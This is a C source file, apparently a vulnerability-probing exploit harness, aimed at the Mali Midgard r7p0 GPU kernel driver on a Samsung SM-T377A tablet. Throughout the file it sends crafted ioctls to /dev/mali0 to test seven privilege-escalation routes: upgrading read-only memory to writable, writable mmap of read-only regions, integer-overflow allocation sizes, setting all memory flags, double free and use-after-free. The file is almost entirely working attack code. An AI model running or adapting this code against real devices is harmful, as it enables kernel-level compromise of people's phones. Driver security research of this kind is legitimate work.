/*
 * mali_mem_exploit.c — Targeted Mali r7p0 memory management exploit
 *
 * Tests for privilege escalation via:
 * 1. MEM_FLAGS_CHANGE: upgrade CPU_RD → CPU_RD|CPU_WR after mmap
 * 2. mmap permission validation bypass (write to read-only GPU mapping)
 * 3. Integer overflow in va_pages/commit_pages
 * 4. GPU memory alias write-to-readonly
 *
 * Target: Samsung SM-T377A, Mali Midgard r7p0-03rel0
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEV_PATH "/dev/mali0"

/* UK interface: single ioctl, first 8 bytes = uk_header */
struct uk_header {
    uint32_t id;
    uint32_t ret;
};

/* Function IDs */
#define UKP_FUNC_ID_CHECK_VERSION 0
#define KBASE_FUNC_SET_FLAGS      530
#define KBASE_FUNC_MEM_ALLOC      512
#define KBASE_FUNC_MEM_IMPORT     513
#define KBASE_FUNC_MEM_COMMIT     514
#define KBASE_FUNC_MEM_QUERY      515
#define KBASE_FUNC_MEM_FREE       516
#define KBASE_FUNC_MEM_FLAGS_CHANGE 517
#define KBASE_FUNC_MEM_ALIAS      518

/* Base memory flags (user-facing) */
#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_PROT_GPU_EX    (1U << 4)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)
#define BASE_MEM_COHERENT_LOCAL (1U << 11)
#define BASE_MEM_CACHED_CPU     (1U << 12)
#define BASE_MEM_SAME_VA        (1U << 17)
#define BASE_MEM_NEED_MMAP      (1U << 18)

/* Structures for Mali UK ioctls */
struct uk_check_version {
    struct uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t  padding[4];
};

struct kbase_uk_mem_alloc {
    struct uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t padding;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint16_t padding2[3];
};

struct kbase_uk_mem_free {
    struct uk_header header;
    uint64_t gpu_addr;
};

struct kbase_uk_mem_flags_change {
    struct uk_header header;
    uint64_t gpu_va;
    uint32_t flags;
    uint32_t mask;
};

struct kbase_uk_mem_query {
    struct uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct kbase_uk_mem_commit {
    struct uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

/* Single ioctl command builder */
static unsigned int make_cmd(uint32_t size) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, size);
}

static int mali_ioctl(int fd, void *buf, uint32_t size) {
    return ioctl(fd, make_cmd(size), buf);
}

static int do_handshake(int fd) {
    struct uk_check_version ver;
    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 0;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0) {
        fprintf(stderr, "[-] CHECK_VERSION failed: %s\n", strerror(errno));
        return -1;
    }
    fprintf(stderr, "[+] CHECK_VERSION: ret=%u, major=%u minor=%u\n",
            ver.header.ret, ver.major, ver.minor);

    uint8_t flags_buf[16];
    memset(flags_buf, 0, sizeof(flags_buf));
    ((struct uk_header*)flags_buf)->id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, flags_buf, sizeof(flags_buf)) < 0) {
        fprintf(stderr, "[-] SET_FLAGS failed: %s\n", strerror(errno));
        return -1;
    }
    fprintf(stderr, "[+] SET_FLAGS: ret=%u\n", ((struct uk_header*)flags_buf)->ret);
    return 0;
}

/* Allocate GPU memory and return the GPU VA */
static uint64_t mali_mem_alloc(int fd, uint64_t pages, uint32_t flags) {
    struct kbase_uk_mem_alloc alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = pages;
    alloc.commit_pages = pages;
    alloc.extent = 0;
    alloc.flags = flags;
    alloc.va_alignment = 0;

    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0) {
        fprintf(stderr, "[-] MEM_ALLOC failed: %s\n", strerror(errno));
        return 0;
    }
    if (alloc.header.ret != 0) {
        fprintf(stderr, "[-] MEM_ALLOC ret=%u\n", alloc.header.ret);
        return 0;
    }
    return alloc.gpu_va;
}

static int mali_mem_free(int fd, uint64_t gpu_addr) {
    struct kbase_uk_mem_free mfree;
    memset(&mfree, 0, sizeof(mfree));
    mfree.header.id = KBASE_FUNC_MEM_FREE;
    mfree.gpu_addr = gpu_addr;
    if (mali_ioctl(fd, &mfree, sizeof(mfree)) < 0)
        return -1;
    return mfree.header.ret;
}

static int mali_mem_flags_change(int fd, uint64_t gpu_va, uint32_t flags, uint32_t mask) {
    struct kbase_uk_mem_flags_change fc;
    memset(&fc, 0, sizeof(fc));
    fc.header.id = KBASE_FUNC_MEM_FLAGS_CHANGE;
    fc.gpu_va = gpu_va;
    fc.flags = flags;
    fc.mask = mask;
    if (mali_ioctl(fd, &fc, sizeof(fc)) < 0)
        return -errno;
    return fc.header.ret;
}

/* ============================================================ */
/* TEST 1: MEM_FLAGS_CHANGE — upgrade read-only to read-write   */
/* ============================================================ */
static void test_flags_change(int fd) {
    fprintf(stderr, "\n=== TEST 1: MEM_FLAGS_CHANGE ===\n");

    /* Allocate as CPU read-only, GPU read-write */
    uint32_t flags_ro = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                        BASE_MEM_PROT_GPU_WR | BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 1, flags_ro);
    if (!gpu_va) {
        fprintf(stderr, "[-] Alloc failed\n");
        return;
    }
    fprintf(stderr, "[+] Allocated 1 page CPU_RD only @ gpu_va=0x%llx\n",
            (unsigned long long)gpu_va);

    /* mmap it — should be read-only */
    void *cpu_addr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd,
                          gpu_va << 12);  /* Mali mmap offset = gpu_va in pages */
    if (cpu_addr == MAP_FAILED) {
        /* Try without page shift */
        cpu_addr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, gpu_va);
        if (cpu_addr == MAP_FAILED) {
            fprintf(stderr, "[-] mmap failed: %s\n", strerror(errno));
            mali_mem_free(fd, gpu_va);
            return;
        }
    }
    fprintf(stderr, "[+] mmap'd @ %p (read-only)\n", cpu_addr);

    /* Try FLAGS_CHANGE to add CPU_WR */
    int ret = mali_mem_flags_change(fd, gpu_va,
        BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR,
        BASE_MEM_PROT_CPU_WR);
    fprintf(stderr, "[*] FLAGS_CHANGE(+CPU_WR) ret=%d\n", ret);

    if (ret == 0) {
        fprintf(stderr, "[!] FLAGS_CHANGE SUCCEEDED — CPU_WR added!\n");

        /* Re-mmap with write perms */
        munmap(cpu_addr, 4096);
        cpu_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                        gpu_va << 12);
        if (cpu_addr == MAP_FAILED)
            cpu_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                            fd, gpu_va);

        if (cpu_addr != MAP_FAILED) {
            fprintf(stderr, "[!!!] WRITABLE MMAP SUCCEEDED @ %p — EXPLOITABLE!\n",
                    cpu_addr);
            /* Write a test pattern */
            ((volatile uint32_t*)cpu_addr)[0] = 0xDEADBEEF;
            fprintf(stderr, "[!!!] Write succeeded: 0x%08x\n",
                    ((volatile uint32_t*)cpu_addr)[0]);
            munmap(cpu_addr, 4096);
        } else {
            fprintf(stderr, "[-] Re-mmap with WRITE failed: %s\n", strerror(errno));
        }
    } else {
        fprintf(stderr, "[*] FLAGS_CHANGE denied (ret=%d) — properly validated\n", ret);
        munmap(cpu_addr, 4096);
    }

    mali_mem_free(fd, gpu_va);
}

/* ============================================================ */
/* TEST 2: mmap permission bypass — request WRITE on RD-only    */
/* ============================================================ */
static void test_mmap_bypass(int fd) {
    fprintf(stderr, "\n=== TEST 2: MMAP PERMISSION BYPASS ===\n");

    /* Allocate CPU read-only */
    uint32_t flags_ro = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                        BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 1, flags_ro);
    if (!gpu_va) return;
    fprintf(stderr, "[+] Allocated CPU_RD-only @ 0x%llx\n", (unsigned long long)gpu_va);

    /* Try to mmap with PROT_WRITE despite read-only allocation */
    void *cpu_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                          fd, gpu_va << 12);
    if (cpu_addr == MAP_FAILED)
        cpu_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                        fd, gpu_va);

    if (cpu_addr != MAP_FAILED) {
        fprintf(stderr, "[!!!] WRITE MMAP ON RD-ONLY REGION SUCCEEDED @ %p!\n", cpu_addr);
        /* Test write */
        ((volatile uint32_t*)cpu_addr)[0] = 0xCAFEBABE;
        fprintf(stderr, "[!!!] Wrote 0x%08x to read-only region — EXPLOITABLE!\n",
                ((volatile uint32_t*)cpu_addr)[0]);
        munmap(cpu_addr, 4096);
    } else {
        fprintf(stderr, "[*] mmap(PROT_WRITE) on RD-only region denied: %s\n",
                strerror(errno));
    }

    mali_mem_free(fd, gpu_va);
}

/* ============================================================ */
/* TEST 3: Integer overflow in va_pages                         */
/* ============================================================ */
static void test_integer_overflow(int fd) {
    fprintf(stderr, "\n=== TEST 3: INTEGER OVERFLOW ===\n");

    /* Try huge va_pages that could overflow to small when multiplied by PAGE_SIZE */
    uint64_t overflow_vals[] = {
        0x100000000ULL / 4096,           /* 2^32 / PAGE_SIZE */
        0x100000000ULL / 4096 + 1,
        0xFFFFFFFFFFFFFFFFULL / 4096,
        0x80000000ULL / 4096,
        0xFFFFFFFF,
        0x7FFFFFFF,
        0,
        1,
    };

    for (int i = 0; i < (int)(sizeof(overflow_vals)/sizeof(overflow_vals[0])); i++) {
        struct kbase_uk_mem_alloc alloc;
        memset(&alloc, 0, sizeof(alloc));
        alloc.header.id = KBASE_FUNC_MEM_ALLOC;
        alloc.va_pages = overflow_vals[i];
        alloc.commit_pages = 1;
        alloc.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                      BASE_MEM_PROT_GPU_RD | BASE_MEM_SAME_VA;

        int r = mali_ioctl(fd, &alloc, sizeof(alloc));
        fprintf(stderr, "[*] va_pages=0x%llx: ioctl=%d, ret=%u, gpu_va=0x%llx\n",
                (unsigned long long)overflow_vals[i], r, alloc.header.ret,
                (unsigned long long)alloc.gpu_va);

        if (r >= 0 && alloc.header.ret == 0 && alloc.gpu_va) {
            fprintf(stderr, "[!] Overflow alloc succeeded! gpu_va=0x%llx\n",
                    (unsigned long long)alloc.gpu_va);
            /* Try mmap */
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                           fd, alloc.gpu_va << 12);
            if (p == MAP_FAILED)
                p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                         fd, alloc.gpu_va);
            if (p != MAP_FAILED) {
                fprintf(stderr, "[!!] Overflow mmap @ %p!\n", p);
                munmap(p, 4096);
            }
            mali_mem_free(fd, alloc.gpu_va);
        }
    }
}

/* ============================================================ */
/* TEST 4: MEM_FLAGS_CHANGE with various flag/mask combos       */
/* ============================================================ */
static void test_flags_change_comprehensive(int fd) {
    fprintf(stderr, "\n=== TEST 4: COMPREHENSIVE FLAGS_CHANGE ===\n");

    /* Allocate with full perms */
    uint32_t flags_rw = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                        BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                        BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 4, flags_rw);
    if (!gpu_va) return;
    fprintf(stderr, "[+] Allocated 4 pages RW @ 0x%llx\n", (unsigned long long)gpu_va);

    /* Test various flags changes */
    struct {
        uint32_t flags;
        uint32_t mask;
        const char *desc;
    } tests[] = {
        { BASE_MEM_PROT_GPU_EX, BASE_MEM_PROT_GPU_EX, "Add GPU_EX (execute)" },
        { BASE_MEM_GROW_ON_GPF, BASE_MEM_GROW_ON_GPF, "Add GROW_ON_GPF" },
        { 0xFFFFFFFF, 0xFFFFFFFF, "Set ALL flags" },
        { BASE_MEM_COHERENT_LOCAL, BASE_MEM_COHERENT_LOCAL, "Add COHERENT_LOCAL" },
        { BASE_MEM_CACHED_CPU, BASE_MEM_CACHED_CPU, "Add CACHED_CPU" },
    };

    for (int i = 0; i < (int)(sizeof(tests)/sizeof(tests[0])); i++) {
        int ret = mali_mem_flags_change(fd, gpu_va, tests[i].flags, tests[i].mask);
        fprintf(stderr, "[*] %s: ret=%d\n", tests[i].desc, ret);
        if (ret == 0)
            fprintf(stderr, "[!] FLAGS_CHANGE succeeded for: %s\n", tests[i].desc);
    }

    mali_mem_free(fd, gpu_va);
}

/* ============================================================ */
/* TEST 5: SAME_VA allocation + mmap at exact address           */
/* ============================================================ */
static void test_same_va(int fd) {
    fprintf(stderr, "\n=== TEST 5: SAME_VA ALLOCATION ===\n");

    /* SAME_VA allocates at the same address in CPU and GPU VA space */
    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                     BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 1, flags);
    if (!gpu_va) return;
    fprintf(stderr, "[+] SAME_VA alloc @ 0x%llx\n", (unsigned long long)gpu_va);

    /* With SAME_VA, the mmap offset should match the gpu_va */
    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                   fd, gpu_va);
    if (p == MAP_FAILED) {
        p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                 fd, gpu_va << 12);
    }
    if (p != MAP_FAILED) {
        fprintf(stderr, "[+] SAME_VA mmap @ %p\n", p);
        ((volatile uint32_t*)p)[0] = 0x41414141;
        fprintf(stderr, "[+] Write OK: 0x%08x\n", ((volatile uint32_t*)p)[0]);
        munmap(p, 4096);
    } else {
        fprintf(stderr, "[-] SAME_VA mmap failed: %s\n", strerror(errno));
    }

    mali_mem_free(fd, gpu_va);
}

/* ============================================================ */
/* TEST 6: Double-free GPU memory                               */
/* ============================================================ */
static void test_double_free(int fd) {
    fprintf(stderr, "\n=== TEST 6: DOUBLE FREE ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 1, flags);
    if (!gpu_va) return;
    fprintf(stderr, "[+] Alloc @ 0x%llx\n", (unsigned long long)gpu_va);

    int r1 = mali_mem_free(fd, gpu_va);
    fprintf(stderr, "[*] First free: ret=%d\n", r1);

    int r2 = mali_mem_free(fd, gpu_va);
    fprintf(stderr, "[*] Second free: ret=%d\n", r2);

    if (r2 == 0) {
        fprintf(stderr, "[!] DOUBLE FREE SUCCEEDED — potential UAF!\n");
    }
}

/* ============================================================ */
/* TEST 7: Use-after-free via mmap on freed region              */
/* ============================================================ */
static void test_uaf_mmap(int fd) {
    fprintf(stderr, "\n=== TEST 7: UAF VIA MMAP ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                     BASE_MEM_SAME_VA;
    uint64_t gpu_va = mali_mem_alloc(fd, 1, flags);
    if (!gpu_va) return;
    fprintf(stderr, "[+] Alloc @ 0x%llx\n", (unsigned long long)gpu_va);

    /* mmap before free */
    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                   fd, gpu_va);
    if (p == MAP_FAILED) {
        p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                 fd, gpu_va << 12);
    }
    if (p == MAP_FAILED) {
        fprintf(stderr, "[-] mmap failed: %s\n", strerror(errno));
        mali_mem_free(fd, gpu_va);
        return;
    }
    fprintf(stderr, "[+] mmap'd @ %p\n", p);

    /* Write before free */
    ((volatile uint32_t*)p)[0] = 0xBEEFCAFE;
    fprintf(stderr, "[+] Pre-free write: 0x%08x\n", ((volatile uint32_t*)p)[0]);

    /* Free the GPU memory */
    int r = mali_mem_free(fd, gpu_va);
    fprintf(stderr, "[*] Free: ret=%d\n", r);

    /* Try to read/write after free */
    fprintf(stderr, "[*] Attempting post-free access...\n");
    volatile uint32_t val = ((volatile uint32_t*)p)[0];
    fprintf(stderr, "[*] Post-free read: 0x%08x\n", val);

    ((volatile uint32_t*)p)[0] = 0xDEADDEAD;
    fprintf(stderr, "[*] Post-free write: 0x%08x\n", ((volatile uint32_t*)p)[0]);

    if (((volatile uint32_t*)p)[0] == 0xDEADDEAD) {
        fprintf(stderr, "[!] POST-FREE WRITE PERSISTED — UAF confirmed!\n");
    }

    munmap(p, 4096);
}

int main(void) {
    fprintf(stderr, "=== Mali r7p0 Memory Exploit Test ===\n");
    fprintf(stderr, "Target: SM-T377A, Mali Midgard r7p0-03rel0\n\n");

    int fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "[-] open(%s): %s\n", DEV_PATH, strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Opened %s (fd=%d)\n", DEV_PATH, fd);

    if (do_handshake(fd) != 0) {
        close(fd);
        return 1;
    }

    test_flags_change(fd);
    test_mmap_bypass(fd);
    test_integer_overflow(fd);
    test_flags_change_comprehensive(fd);
    test_same_va(fd);
    test_double_free(fd);
    test_uaf_mmap(fd);

    fprintf(stderr, "\n=== All tests complete ===\n");
    close(fd);
    return 0;
}
